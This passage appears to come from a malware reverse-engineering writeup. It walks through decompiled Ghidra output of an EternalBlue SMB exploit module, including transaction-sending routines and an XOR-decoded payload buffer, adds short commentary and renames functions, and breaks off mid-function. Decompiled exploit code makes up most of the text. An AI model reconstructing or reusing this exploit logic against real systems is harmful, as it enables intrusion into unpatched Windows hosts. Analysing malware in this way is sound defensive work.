+### FUN_100051f3 (EternalBlue)
+
+```cpp
+undefined4 FUN_100051f3(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5){
+  undefined4 uVar1;
+  int iVar2;
+  uint uVar3;
+  undefined4 unaff_EDI;
+  bool bVar4;
+  undefined4 local_c;
+  int local_8;
+  
+  local_8 = 0;
+  local_c = 0;
+  uVar1 = 0x28;
+  if (eternal_DAT_1001f8fc != '\0') {
+    uVar1 = 0x40;
+  }
+  iVar2 = eternal_send_multiple_transactions
+                    (param_1,param_2,param_3,param_4,param_5,DAT_1001fad8,DAT_1001fadc,DAT_1001fae8,
+                     DAT_1001faec,uVar1,&local_8,&local_c);
+  if (iVar2 != -1) {
+    if (eternal_DAT_1001f8fc == '\0') {
+      DAT_1001fb00 = *(uint *)(local_8 + 0x24);
+      DAT_1001fb04 = 0;
+      if (0x7fffffff < DAT_1001fb00) goto LAB_100052a0;
+    }
+    else {
+      DAT_1001fb00 = *(uint *)(local_8 + 0x38);
+      DAT_1001fb04 = *(int *)(local_8 + 0x3c);
+      iVar2 = eternal_negative_not_null(DAT_1001fb00,DAT_1001fb04);
+      if (iVar2 != 0) {
+LAB_100052a0:
+        eternal_free(&local_8);
+        if (eternal_DAT_1001f8fc == '\0') {
+          bVar4 = DAT_1001fb00 < 0xb00;
+          uVar3 = DAT_1001fb00 - 0xb00;
+        }
+        else {
+          bVar4 = DAT_1001fb00 < 0x1000;
+          uVar3 = DAT_1001fb00 - 0x1000;
+        }
+        iVar2 = FUN_100050e0(param_1,param_2,param_3,param_4,param_5,unaff_EDI,uVar3,
+                             DAT_1001fb04 - (uint)bVar4,0x1000);
+        if (iVar2 == 0) {
+          return 0;
+        }
+        uVar1 = FUN_100050e0(param_1,param_2,param_3,param_4,param_5,unaff_EDI,DAT_1001fb00 - 0x1800
+                             ,DAT_1001fb04 - (uint)(DAT_1001fb00 < 0x1800),0x2800);
+        return uVar1;
+      }
+    }
+  }
+  eternal_free(&local_8);
+  return 0xffffffff;
+}
+```
+
+This function appears to be sending multiple transactions again using both stored data and storing data that was returned. At the end we see two calls into `FUN_100050e0`.
+
+### FUN_100050e0 (EternalBlue)
+
+```cpp
+undefined4 FUN_100050e0(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,undefined4 param_6,uint param_7,int param_8,uint param_9){
+  uint uVar1;
+  uint num_bytes;
+  LPVOID pvVar2;
+  undefined4 uVar3;
+  int iVar4;
+  uint uVar5;
+  uint uVar6;
+  LPVOID *ppvVar7;
+  bool bVar8;
+  uint local_24;
+  int local_20;
+  uint local_10;
+  LPVOID local_c;
+  LPVOID local_8;
+  
+  num_bytes = param_9 & 0xffff;
+  uVar5 = 0x400;
+  pvVar2 = allocate_memory(num_bytes);
+  if (pvVar2 == (LPVOID)0x0) {
+LAB_10005106:
+    uVar3 = 0xffffffff;
+  }
+  else {
+    param_9 = param_9 & 0xffff;
+    local_8 = (void *)0x0;
+    local_10 = 0;
+    local_24 = param_7;
+    local_20 = param_8;
+    uVar6 = 0;
+    local_c = pvVar2;
+    do {
+      if ((ushort)param_9 == 0) {
+LAB_100051d9:
+        ppvVar7 = &local_c;
+LAB_100051dc:
+        eternal_free(ppvVar7);
+        goto LAB_10005106;
+      }
+      if ((ushort)param_9 < (ushort)uVar5) {
+        uVar5 = param_9 & 0xffff;
+      }
+      iVar4 = eternal_send_multiple_transactions
+                        (param_1,param_2,param_3,param_4,param_5,local_24,local_20,DAT_1001fae8,
+                         DAT_1001faec,uVar5,&local_8,&local_10);
+      if (iVar4 == -1) {
+LAB_100051e6:
+        eternal_free(&local_c);
+        ppvVar7 = &local_8;
+        goto LAB_100051dc;
+      }
+      if (local_8 == (void *)0x0) goto LAB_100051d9;
+      uVar1 = (local_10 & 0xffff) + uVar6;
+      if (num_bytes <= uVar1) goto LAB_100051e6;
+      memcpy((void *)((int)pvVar2 + uVar6),local_8,local_10 & 0xffff);
+      eternal_free(&local_8);
+      bVar8 = CARRY4(local_24,uVar5);
+      local_24 = local_24 + uVar5;
+      local_20 = local_20 + (uint)bVar8;
+      param_9 = param_9 - uVar5;
+      iVar4 = FUN_1000501b(param_7,param_8);
+      uVar6 = uVar1;
+    } while (iVar4 != 0);
+    eternal_free(&local_c);
+    uVar3 = 0;
+  }
+  return uVar3;
+}
+```
+
+Here we again we multipled transactions being sent with the data that was passed to this function. Near the end we also see a call to `FUN_1000501b`.
+
+### FUN_1000501b (EternalBlue)
+
+```cpp
+undefined4 __thiscall FUN_1000501b(int param_1,uint param_1_00,int param_2){
+  int in_EAX;
+  uint uVar1;
+  int iVar2;
+  int iVar3;
+  uint uVar4;
+  uint extraout_ECX;
+  uint uVar5;
+  uint local_c;
+  uint local_8;
+  
+  local_8 = 0;
+  iVar3 = 0x4c;
+  if (eternal_DAT_1001f8fc != '\0') {
+    iVar3 = 0x98;
+  }
+  uVar4 = param_1_00 & 0xf;
+  uVar5 = 0x10 - uVar4;
+  do {
+    if ((uint)(in_EAX - iVar3) <= uVar5) {
+      return 0xffffffff;
+    }
+    iVar2 = *(int *)(uVar5 + param_1);
+    if (iVar2 == -0x1010102) {
+      local_8 = local_8 + 1;
+    }
+    else {
+      if (0x23 < local_8) {
+        if (eternal_DAT_1001f8fc == '\0') {
+          uVar4 = uVar5;
+          if (*(int *)(uVar5 + 0x38 + param_1) == *(int *)(uVar5 + 0x3c + param_1)) {
+            local_c = 0;
+            while (iVar2 - param_1_00 < 0x100001) {
+              uVar4 = uVar4 + 4;
+              local_c = local_c + 1;
+              if (0x11 < local_c) {
+                uVar1 = (uint)(*(int *)(uVar4 + param_1) == 0);
+                goto LAB_100050a9;
+              }
+              iVar2 = *(int *)(uVar4 + param_1);
+            }
+          }
+          uVar1 = 0;
+        }
+        else {
+          uVar1 = FUN_10004fb3(uVar4,uVar5,param_1_00,param_2);
+          uVar4 = extraout_ECX;
+        }
+LAB_100050a9:
+        if (uVar1 != 0) {
+          _DAT_1001fae0 = uVar5 + param_1_00;
+          _DAT_1001fae4 = param_2 + (uint)CARRY4(uVar5,param_1_00);
+          return 0;
+        }
+      }
+    }
+    uVar5 = uVar5 + 4;
+  } while( true );
+}
+```
+
+This function appears to be a loop waiting for a certain condition to be met and `FUN_10004fb3` can be called from time to time in this flow.
+
+### FUN_10004fb3 (EternalBlue)
+
+```cpp
+undefined4 __fastcall FUN_10004fb3(undefined4 param_1,int param_2,uint param_3,int param_4){
+  uint *puVar1;
+  int iVar2;
+  uint uVar3;
+  uint uVar4;
+  uint uVar5;
+  uint uVar6;
+  int unaff_ESI;
+  bool bVar7;
+  
+  puVar1 = (uint *)(unaff_ESI + param_2);
+  if ((puVar1[0x1c] == puVar1[0x1e]) && (puVar1[0x1d] == puVar1[0x1f])) {
+    uVar6 = 0;
+    uVar3 = (uint)(*puVar1 < param_3);
+    bVar7 = (int)((puVar1[1] - param_4) - uVar3) < 0;
+    if ((puVar1[1] - param_4 == uVar3 || bVar7) && ((bVar7 || (*puVar1 - param_3 < 0x100001)))) {
+      while( true ) {
+        param_2 = param_2 + 8;
+        uVar3 = *(uint *)(unaff_ESI + param_2);
+        uVar6 = uVar6 + 1;
+        if (0x11 < uVar6) break;
+        iVar2 = *(int *)(unaff_ESI + 4 + param_2);
+        uVar4 = (uint)(uVar3 < param_3);
+        uVar5 = iVar2 - param_4;
+        bVar7 = (int)(uVar5 - uVar4) < 0;
+        if (!bVar7) {
+          if (uVar5 != uVar4 && (SBORROW4(iVar2,param_4) != SBORROW4(uVar5,uVar4)) == bVar7) {
+            return 0;
+          }
+          if (0x100000 < uVar3 - param_3) {
+            return 0;
+          }
+        }
+      }
+      if ((uVar3 | *(uint *)(unaff_ESI + 4 + param_2)) == 0) {
+        return 1;
+      }
+    }
+  }
+  return 0;
+}
+```
+
+This function mainly appears to do a lot of field checking and setting on the passed data. But since we do not know any exact types this does not give a lot of information. We will rename this function to `eternal_check_fields`.
+
+### Back to FUN_1000501b
+
+We will rename this function to `eternal_wait_for_condition` given teh overal structure of the subroutine.
+
+### Back to FUN_100050e0
+
+Given that we assume the last call to be a wait of sorts that determines whether to continue the loop or not we will name this subroutine based on the rest of the functions, so we name it `eternal_send_transaction_until_condition`.
+
+### Back to FUN_100051f3
+
+Given that this finishes the function we will rename it to `eternal_send_transactions_until_success`.
+
+### Back to eternal_blue_main
+
+We have no arrived at the statement beyond the chain of if statements, which is a function call to `FUN_10005333`.
+
+### FUN_10005333 (EternalBlue)
+
+```cpp
+undefined4 FUN_10005333(undefined4 param_1,int param_2,undefined4 param_3,undefined4 *param_4,undefined4 param_5,undefined4 param_6,byte *param_7){
+  byte bVar1;
+  int iVar2;
+  uint *puVar3;
+  SIZE_T num_bytes;
+  undefined4 uVar4;
+  uint uVar5;
+  byte *pbVar6;
+  int iVar7;
+  undefined4 unaff_EBX;
+  uint **ppuVar8;
+  int iVar9;
+  void *pvVar10;
+  bool bVar11;
+  SIZE_T local_18 [2];
+  void *local_10;
+  int local_c;
+  uint *local_8;
+  
+  local_10 = (void *)0x0;
+  iVar2 = eternal_send_nt_create_smb_msg
+                    (param_1,(short)param_2,(short)param_3,(short)param_4,(short)unaff_EBX,
+                     (undefined2)param_5,(undefined2 *)&local_10,(char)param_7);
+  if (iVar2 == -1) {
+    return 0xffffffff;
+  }
+  param_7 = (byte *)allocate_memory(0x2f);
+  pvVar10 = local_10;
+  iVar2 = _DAT_1001fb14;
+  if ((uint *)param_7 == (uint *)0x0) {
+    return 0xffffffff;
+  }
+  bVar11 = eternal_DAT_1001f8fc != '\0';
+  *(byte *)((int)param_7 + 0xf) = 4;
+  uVar5 = iVar2 + 4;
+  *(byte *)((int)param_7 + 0x1f) = 0x10;
+  *(byte *)((uint *)param_7 + 0xb) = 1;
+  if (bVar11) {
+    uVar5 = iVar2 + 8;
+  }
+  local_8 = (uint *)eternal_send_appropriate_secondary_transaction
+                              (param_1,param_2,param_3,param_4,unaff_EBX,local_10,0x20,param_7,0x2f,
+                               DAT_1001fae8,DAT_1001faec,uVar5 & 0xffff);
+  eternal_free(&param_7);
+  if (local_8 == (uint *)0xffffffff) {
+    return 0xffffffff;
+  }
+  if (_DAT_1001fb40 == 0) {
+    iVar2 = (uint)(eternal_DAT_1001f8fc != '\0') * 4;
+    local_c = iVar2 + 4;
+    local_18[0] = iVar2 + 0x13;
+    param_7 = (byte *)allocate_memory(local_18[0]);
+    iVar2 = DAT_1001faec;
+    if ((uint *)param_7 == (uint *)0x0) {
+      return 0xffffffff;
+    }
+    uVar5 = (uint)DAT_1001fb20;
+    if (eternal_DAT_1001f8fc == '\0') {
+      *(int *)((int)param_7 + 0xf) = uVar5 + DAT_1001fae8;
+    }
+    else {
+      iVar7 = DAT_1001faec + (uint)CARRY4(uVar5,DAT_1001fae8);
+      *(int *)((int)param_7 + 0xf) = uVar5 + DAT_1001fae8;
+      *(int *)((int)param_7 + 0x13) = iVar7;
+    }
+    local_8 = (uint *)eternal_send_appropriate_secondary_transaction
+                                (param_1,param_2,param_3,param_4,unaff_EBX,pvVar10,local_c,param_7,
+                                 local_18[0],DAT_1001fae8,iVar2,(uint)DAT_1001fb10);
+    eternal_free(&param_7);
+    if (local_8 == (uint *)0xffffffff) {
+      return 0xffffffff;
+    }
+    _DAT_1001fb40 = 1;
+    param_7 = (byte *)allocate_memory(0x10);
+    iVar2 = DAT_1001faec;
+    if ((uint *)param_7 == (uint *)0x0) {
+      return 0xffffffff;
+    }
+    uVar5 = (uint)DAT_1001fb34;
+    *(byte *)((int)param_7 + 0xf) = 1;
+    local_8 = (uint *)eternal_send_appropriate_secondary_transaction
+                                (param_1,param_2,param_3,param_4,unaff_EBX,pvVar10,1,param_7,0x10,
+                                 DAT_1001fae8,iVar2,uVar5);
+    eternal_free(&param_7);
+    if (local_8 == (uint *)0xffffffff) {
+      return 0xffffffff;
+    }
+  }
+  param_7 = (byte *)allocate_memory(0x13);
+  if ((uint *)param_7 == (uint *)0x0) {
+    return 0xffffffff;
+  }
+  *(undefined2 *)((int)param_7 + 0x11) = (short)pvVar10;
+  *(undefined2 *)((int)param_7 + 0xf) = 0x36;
+  local_8 = (uint *)eternal_send_appropriate_secondary_transaction
+                              (param_1,param_2,param_3,param_4,unaff_EBX,pvVar10,4,param_7,0x13,
+                               DAT_1001fae8,DAT_1001faec,(uint)DAT_1001fb20);
+  eternal_free(&param_7);
+  if (local_8 == (uint *)0xffffffff) {
+    return 0xffffffff;
+  }
+  if (_DAT_1001fb3c != 0) {
+    puVar3 = (uint *)allocate_memory(0x10);
+    if (puVar3 == (uint *)0x0) {
+      return 0xffffffff;
+    }
+    param_7 = (byte *)puVar3;
+    iVar7 = eternal_send_appropriate_secondary_transaction
+                      (param_1,param_2,param_3,param_4,unaff_EBX,pvVar10,1,puVar3,0x10,DAT_1001fae8,
+                       DAT_1001faec,(uint)DAT_1001fb1c);
+    iVar2 = DAT_1001faec;
+    if (iVar7 == -1) {
+      ppuVar8 = (uint **)&param_7;
+      goto LAB_10005593;
+    }
+    uVar5 = (uint)DAT_1001fb2c;
+    *(byte *)((int)puVar3 + 0xf) = 2;
+    local_8 = (uint *)eternal_send_appropriate_secondary_transaction
+                                (param_1,param_2,param_3,param_4,unaff_EBX,pvVar10,1,puVar3,0x10,
+                                 DAT_1001fae8,iVar2,uVar5);
+    eternal_free(&param_7);
+    if (local_8 == (uint *)0xffffffff) {
+      return 0xffffffff;
+    }
+  }
+  if (_DAT_1001fb38 != 0) {
+    param_7 = (byte *)allocate_memory(0x10);
+    if ((uint *)param_7 == (uint *)0x0) {
+      return 0xffffffff;
+    }
+    local_8 = (uint *)eternal_send_appropriate_secondary_transaction
+                                (param_1,param_2,param_3,param_4,unaff_EBX,pvVar10,1,param_7,0x10,
+                                 DAT_1001fae8,DAT_1001faec,(uint)DAT_1001fb30);
+    eternal_free(&param_7);
+    if (local_8 == (uint *)0xffffffff) {
+      return 0xffffffff;
+    }
+    _DAT_1001fb38 = 0;
+  }
+  iVar2 = (uint)(eternal_DAT_1001f8fc != '\0') * 4;
+  local_c = iVar2 + 4;
+  num_bytes = iVar2 + 0x13;
+  param_7 = (byte *)allocate_memory(num_bytes);
+  if ((uint *)param_7 == (uint *)0x0) {
+    return 0xffffffff;
+  }
+  iVar2 = eternal_send_appropriate_secondary_transaction
+                    (param_1,param_2,param_3,param_4,unaff_EBX,pvVar10,local_c,param_7,num_bytes,
+                     DAT_1001fae8,DAT_1001faec,(uint)DAT_1001fb28);
+  eternal_free(&param_7);
+  if (iVar2 == -1) {
+    return 0xffffffff;
+  }
+  _DAT_1001fb3c = 1;
+  param_7 = (byte *)allocate_memory(0xf);
+  if ((uint *)param_7 == (uint *)0x0) {
+    return 0xffffffff;
+  }
+  local_10 = (void *)0x0;
+  local_8 = (uint *)0x0;
+  iVar2 = eternal_send_transaction_secondary_smb_msg
+                    (param_1,param_2,param_3,param_4,unaff_EBX,(uint)DAT_1001fb44,0,0,param_7,
+                     &local_8,&local_10,0);
+  eternal_free(&param_7);
+  if (iVar2 == -1) {
+    return 0xffffffff;
+  }
+  iVar2 = FUN_10004c1c(param_1,param_2,param_3,param_4,unaff_EBX,(uint)DAT_1001fb28 + DAT_1001fae8,
+                       DAT_1001faec + (uint)CARRY4((uint)DAT_1001fb28,DAT_1001fae8),DAT_1001fae8,
+                       DAT_1001faec,local_c,&local_8,&local_10);
+  if (iVar2 != -1) {
+    if (eternal_DAT_1001f8fc == '\0') {
+      if (3 < (ushort)local_10) {
+        DAT_1001faf8 = *local_8;
+        DAT_1001fafc = 0;
+        if (0x7fffffff < DAT_1001faf8) goto LAB_100057ab;
+      }
+    }
+    else {
+      if (7 < (ushort)local_10) {
+        DAT_1001faf8 = *local_8;
+        DAT_1001fafc = local_8[1];
+        iVar2 = eternal_negative_not_null(DAT_1001faf8,DAT_1001fafc);
+        if (iVar2 != 0) {
+LAB_100057ab:
+          eternal_free(&local_8);
+          iVar2 = DAT_1001faf8 + 0x100;
+          pvVar10 = (void *)(DAT_1001fafc + (0xfffffeff < DAT_1001faf8));
+          local_18[0] = (uint)(eternal_DAT_1001f8fc == '\0') * 2 + 0xe5c;
+          local_10 = allocate_memory(local_18[0]);
+          if (local_10 == (LPVOID)0x0) {
+            return 0xffffffff;
+          }
+          if (eternal_DAT_1001f8fc == '\0') {
+            *(undefined2 *)((int)local_10 + 0xf) = 1000;
+            *(undefined2 *)((int)local_10 + 0x14) = 0x4c2;
+            param_7 = &DAT_100131a8;
+            pbVar6 = (byte *)((int)local_10 + 0x17);
+            local_c = 0xe47;
+            do {
+              bVar1 = *param_7;
+              param_7 = param_7 + 1;
+              *pbVar6 = bVar1 ^ 0xcc;
+              pbVar6 = pbVar6 + 1;
+              local_c = local_c + -1;
+            } while (local_c != 0);
+          }
+          else {
+            *(undefined2 *)((int)local_10 + 0xf) = 0x1e8;
+            *(undefined *)((int)local_10 + 0x14) = 0xc3;
+            param_7 = &DAT_100131a8;
+            pbVar6 = (byte *)((int)local_10 + 0x15);
+            local_c = 0xe47;
+            do {
+              bVar1 = *param_7;
+              param_7 = param_7 + 1;
+              *pbVar6 = bVar1 ^ 0xcc;
+              pbVar6 = pbVar6 + 1;
+              local_c = local_c + -1;
+            } while (local_c != 0);
+          }
+          if (eternal_DAT_1001f8fc == '\0') {
+            local_8 = (uint *)&DAT_00000004;
+            param_7 = (byte *)CONCAT13(0x38,param_7._0_3_);
+          }
+          else {
+            local_8 = (uint *)&DAT_00000008;
+            param_7 = (byte *)CONCAT13(0x70,param_7._0_3_);
+          }
+          iVar7 = eternal_send_appropriate_secondary_transaction
+                            (param_1,param_2,param_3,param_4,unaff_EBX,param_6,local_8,local_10,
+                             local_18[0],iVar2,(int)pvVar10,0);
+          eternal_free(&local_10);
+          if (iVar7 != -1) {
+            if ((_DAT_1001faf0 != iVar2) || (DAT_1001faf4 != pvVar10)) {
+              uVar5 = DAT_1001fb08 + -0x200 + DAT_1001fb24 & 0xffff;
+              if ((ushort)uVar5 < 0xfe81) {
+                iVar7 = eternal_send_secondary_block
+                                  (param_1,param_2,param_3,param_4,unaff_EBX,param_6,iVar2,pvVar10,
+                                   uVar5);
+                _DAT_1001faf0 = iVar2;
+                DAT_1001faf4 = pvVar10;
+              }
+              else {
+                iVar7 = -1;
+                _DAT_1001faf0 = iVar2;
+                DAT_1001faf4 = pvVar10;
+              }
+            }
+            if (iVar7 != -1) {
+              iVar9 = ((uint)param_7 >> 0x18) + _DAT_1001fae0;
+              local_10 = (LPVOID)(_DAT_1001fae4 + (uint)CARRY4((uint)param_7 >> 0x18,_DAT_1001fae0))
+              ;
+              if ((_DAT_1001faf0 != iVar9) || (DAT_1001faf4 != local_10)) {
+                uVar5 = DAT_1001fb08 + -0x200 + DAT_1001fb24 & 0xffff;
+                if ((ushort)uVar5 < 0xfe81) {
+                  iVar7 = eternal_send_secondary_block
+                                    (param_1,param_2,param_3,param_4,unaff_EBX,param_6,iVar9,
+                                     local_10,uVar5);
+                  _DAT_1001faf0 = iVar9;
+                  DAT_1001faf4 = local_10;
+                }
+                else {
+                  iVar7 = -1;
+                  _DAT_1001faf0 = iVar9;
+                  DAT_1001faf4 = local_10;
+                }
+              }
+              if (iVar7 == -1) {
+                return 0xffffffff;
+              }
+              DAT_1001fb08 = 0x200;
+              iVar2 = eternal_send_secondary_block
+                                (param_1,param_2,param_3,param_4,unaff_EBX,0,iVar2,pvVar10,0);
+              if (iVar2 == -1) {
+                return 0xffffffff;
+              }
+              param_4 = (undefined4 *)allocate_memory(0xc);
+              if (param_4 != (undefined4 *)0x0) {
+                param_2 = 0;
+                local_10 = allocate_memory(0xd);
+                if (local_10 != (LPVOID)0x0) {
+                  uVar4 = eternal_send_transaction2_smb_msg
+                                    (param_1,0,(short)param_3,0xfeff,(short)unaff_EBX,
+                                     (undefined2)param_5,0xf0,param_4,local_10,0xd,&param_2,
+                                     &local_10,(undefined2 *)local_18);
+                  eternal_free(&param_4);
+                  eternal_free(&local_10);
+                  return uVar4;
+                }
+                return 0xffffffff;
+              }
+              return 0xffffffff;
+            }
+          }
+          return 0xffffffff;
+        }
+      }
+    }
+  }
+  ppuVar8 = &local_8;
+LAB_10005593:
+  eternal_free(ppuVar8);
+  return 0xffffffff;
+}
+```
+
+This is a surprisingly long function again. We see that it starts off sending a NT create SMB message followed by an appropriate secondary transaction based on previously received data stored in globals.
+
+This function them proceeds to send up to eight more appropriate secondary transmissions. This again could be the payload, though at this point we really have no clue without explicitly checking and tracking down where the payload data is actually passed to.
+
+After all the secondary transmissions we see a call to `FUN_10004c1c`.
+
+### FUN_10004c1c (EternalBlue)
+
+```cpp
+undefined4 FUN_10004c1c(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,undefined4 param_6,undefined4 param_7,uint param_8,int param_9,uint param_10,LPVOID *param_11,ushort *param_12){
+  ushort uVar1;
+  undefined4 in_EAX;
+  SIZE_T num_bytes;
+  int iVar2;
+  uint uVar3;
+  LPVOID pvVar4;
+  LPVOID _Dst;
+  uint num_bytes_00;
+  LPVOID *ppvVar5;
+  undefined4 uVar6;
+  undefined4 local_18;
+  uint local_14;
+  LPVOID local_10;
+  int local_c;
+  LPVOID local_8;
+  
+  local_18 = 0;
+  local_10 = (LPVOID)0x0;
+  local_c = 4;
+  local_14 = 0;
+  if (eternal_DAT_1001f8fc != '\0') {
+    local_c = 8;
+    local_14 = 4;
+  }
+  num_bytes = local_c + 0x2f;
+  local_8 = allocate_memory(num_bytes);
+  if (local_8 == (LPVOID)0x0) {
+    return 0xffffffff;
+  }
+  *(undefined4 *)((int)local_8 + 0xf) = param_6;
+  *(undefined4 *)((int)local_8 + 0x13) = param_7;
+  num_bytes_00 = local_14 & 0xffff;
+  *(undefined4 *)(num_bytes_00 + 0x13 + (int)local_8) = 4;
+  *(undefined4 *)(num_bytes_00 + 0x22 + (int)local_8) = 0x1000;
+  *(uint *)(num_bytes_00 + 0x2f + (int)local_8) = param_10 & 0xffff;
+  iVar2 = eternal_send_appropriate_secondary_transaction
+                    (param_1,param_2,param_3,param_4,param_5,in_EAX,local_c,local_8,num_bytes,
+                     param_8,param_9,(uint)DAT_1001fb14);
+  eternal_free(&local_8);
+  if (iVar2 == -1) {
+    return 0xffffffff;
+  }
+  if (_DAT_1001fb40 == 0) {
+    num_bytes_00 = local_c + 0xfU & 0xffff;
+    local_8 = allocate_memory(num_bytes_00);
+    if (local_8 == (LPVOID)0x0) {
+      return 0xffffffff;
+    }
+    uVar3 = (uint)DAT_1001fb20;
+    if (eternal_DAT_1001f8fc == '\0') {
+      *(int *)((int)local_8 + 0xf) = uVar3 + param_8;
+    }
+    else {
+      *(int *)((int)local_8 + 0xf) = uVar3 + param_8;
+      *(int *)((int)local_8 + 0x13) = param_9 + (uint)CARRY4(uVar3,param_8);
+    }
+    iVar2 = eternal_send_appropriate_secondary_transaction
+                      (param_1,param_2,param_3,param_4,param_5,in_EAX,local_c,local_8,num_bytes_00,
+                       param_8,param_9,(uint)DAT_1001fb10);
+    eternal_free(&local_8);
+    if (iVar2 == -1) {
+      return 0xffffffff;
+    }
+    _DAT_1001fb40 = 1;
+    local_8 = allocate_memory(0x10);
+    if (local_8 == (LPVOID)0x0) {
+      return 0xffffffff;
+    }
+    num_bytes_00 = (uint)DAT_1001fb34;
+    *(undefined *)((int)local_8 + 0xf) = 1;
+    iVar2 = eternal_send_appropriate_secondary_transaction
+                      (param_1,param_2,param_3,param_4,param_5,in_EAX,1,local_8,0x10,param_8,param_9
+                       ,num_bytes_00);
+    eternal_free(&local_8);
+    if (iVar2 == -1) {
+      return 0xffffffff;
+    }
+  }
+  local_8 = allocate_memory(0x13);
+  if (local_8 == (LPVOID)0x0) {
+    return 0xffffffff;
+  }
+  *(undefined2 *)((int)local_8 + 0x11) = (short)in_EAX;
+  *(undefined2 *)((int)local_8 + 0xf) = 0x23;
+  iVar2 = eternal_send_appropriate_secondary_transaction
+                    (param_1,param_2,param_3,param_4,param_5,in_EAX,4,local_8,0x13,param_8,param_9,
+                     (uint)DAT_1001fb20);
+  eternal_free(&local_8);
+  if (iVar2 == -1) {
+    return 0xffffffff;
+  }
+  if (_DAT_1001fb3c != 0) {
+    pvVar4 = allocate_memory(0x10);
+    if (pvVar4 == (LPVOID)0x0) {
+      return 0xffffffff;
+    }
+    local_8 = pvVar4;
+    iVar2 = eternal_send_appropriate_secondary_transaction
+                      (param_1,param_2,param_3,param_4,param_5,in_EAX,1,pvVar4,0x10,param_8,param_9,
+                       (uint)DAT_1001fb1c);
+    if (iVar2 == -1) {
+      ppvVar5 = &local_8;
+      goto LAB_10004e55;
+    }
+    num_bytes_00 = (uint)DAT_1001fb2c;
+    *(undefined *)((int)pvVar4 + 0xf) = 2;
+    iVar2 = eternal_send_appropriate_secondary_transaction
+                      (param_1,param_2,param_3,param_4,param_5,in_EAX,1,pvVar4,0x10,param_8,param_9,
+                       num_bytes_00);
+    eternal_free(&local_8);
+    if (iVar2 == -1) {
+      return 0xffffffff;
+    }
+  }
+  if (_DAT_1001fb38 != 0) {
+    local_8 = allocate_memory(0x10);
+    if (local_8 == (LPVOID)0x0) {
+      return 0xffffffff;
+    }
+    iVar2 = eternal_send_appropriate_secondary_transaction
+                      (param_1,param_2,param_3,param_4,param_5,in_EAX,1,local_8,0x10,param_8,param_9
+                       ,(uint)DAT_1001fb30);
+    eternal_free(&local_8);
+    if (iVar2 == -1) {
+      return 0xffffffff;
+    }
+    _DAT_1001fb38 = 0;
+  }
+  _DAT_1001fb3c = 1;
+  local_8 = allocate_memory(0xf);
+  if (local_8 == (LPVOID)0x0) {
+    return 0xffffffff;
+  }
+  iVar2 = eternal_send_transaction_secondary_smb_msg
+                    (param_1,param_2,param_3,param_4,param_5,(uint)DAT_1001fb44,0,0,local_8,
+                     &local_10,&local_18,1);
+  eternal_free(&local_8);
+  pvVar4 = local_10;
+  if (iVar2 == -0x7ffffffb) {
+    if (local_10 == (LPVOID)0x0) {
+      return 0xffffffff;
+    }
+    uVar1 = *(ushort *)((int)local_10 + 0x31);
+    *param_12 = uVar1;
+    if (uVar1 < (ushort)local_18) {
+      _Dst = allocate_memory((uint)uVar1);
+      *param_11 = _Dst;
+      if (_Dst == (LPVOID)0x0) {
+        uVar6 = 0xffffffff;
+      }
+      else {
+        memcpy(_Dst,(void *)((uint)*(ushort *)((int)pvVar4 + 0x33) + 4 + (int)pvVar4),
+               (uint)*param_12);
+        uVar6 = 0;
+      }
+      eternal_free(&local_10);
+      return uVar6;
+    }
+  }
+  ppvVar5 = &local_10;
+LAB_10004e55:
+  eternal_free(ppvVar5);
+  return 0xffffffff;
+}
+```
+
+Again here we see a surpringly large function that sends up to eight more appropriate follow up secondary transaction blocks. Lets rename the function to `eternal_send_multiple_transactions`.
+
+### Back to FUN_10005333
+
+After all the secondary transactions are sent we first see more globals being updated and data being prepared. This is then followed up by sending up to 5 more transation messages after which the function returns. We will rename the function to `eternal_send_many_transactions`.
+
+### Back to eternal_blue_main
+
+Having finished this entire if chain we move on to the other branches. At `LAB_10005d53` we see more logic that triggest based on values in the payload. This leads directly into acall to `FUN_10002547`.
+
+### FUN_10002547 (EternalBlue)
+
+```cpp
+undefined4 * FUN_10002547(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,undefined4 *param_5){
+  uint uVar1;
+  ushort *in_EAX;
+  undefined4 *puVar2;
+  undefined4 extraout_ECX;
+  int iVar3;
+  undefined4 *puVar4;
+  undefined4 *puVar5;
+  uint local_10;
+  undefined2 *local_c;
+  LPVOID local_8;
+  
+  local_8 = allocate_memory(0x3ec);
+  if (local_8 != (LPVOID)0x0) {
+    *(undefined *)((int)local_8 + 0x1e) = 1;
+    local_10 = 0;
+    local_c = FUN_100024d0(extraout_ECX,(undefined2 *)&local_10,local_8);
+    uVar1 = local_10;
+    if (local_c != (undefined2 *)0x0) {
+      *in_EAX = (ushort)(local_10 + 0x24);
+      param_5 = (undefined4 *)
+                eternal_create_smb_message
+                          (local_10 + 0x24,0xa0,0xc007,param_1,param_2,param_3,param_4,
+                           (short)param_5);
+      if (param_5 == (undefined4 *)0x0) {
+        eternal_free(&local_c);
+        eternal_free(&local_8);
+        return (undefined4 *)0;
+      }
+      puVar2 = (undefined4 *)allocate_memory((uint)*in_EAX);
+      puVar4 = (undefined4 *)0x0;
+      if (puVar2 != (undefined4 *)0x0) {
+        iVar3 = 9;
+        puVar4 = param_5;
+        puVar5 = puVar2;
+        while (iVar3 != 0) {
+          iVar3 = iVar3 + -1;
+          *puVar5 = *puVar4;
+          puVar4 = puVar4 + 1;
+          puVar5 = puVar5 + 1;
+        }
+        memcpy(puVar2 + 9,local_c,uVar1 & 0xffff);
+        puVar4 = puVar2;
+      }
+      eternal_free(&local_c);
+      eternal_free(&local_8);
+      eternal_free(&param_5);
+      return puVar4;
+    }
+    eternal_free(&local_8);
+  }
+  return (undefined4 *)0;
+}
+```
+
+This function starts of with a call to `FUN_100024d0`.
+
+### FUN_100024d0 (EternalBlue)
+
+```cpp
+undefined2 * __fastcall FUN_100024d0(undefined4 param_1,undefined2 *param_2,void *param_3){
+  undefined2 *puVar1;
+  
+  if (param_3 == (void *)0x0) {
+    puVar1 = (undefined2 *)0x0;
+  }
+  else {
+    *param_2 = 0x418;
+    puVar1 = (undefined2 *)allocate_memory(0x418);
+    if (puVar1 != (undefined2 *)0x0) {
+      *(undefined4 *)(puVar1 + 2) = 0x1e;
+      *(undefined4 *)(puVar1 + 6) = 0x1e;
+      *(undefined4 *)(puVar1 + 10) = 0x1e;
+      *puVar1 = 0x114;
+      *(undefined4 *)(puVar1 + 4) = 0x103d0;
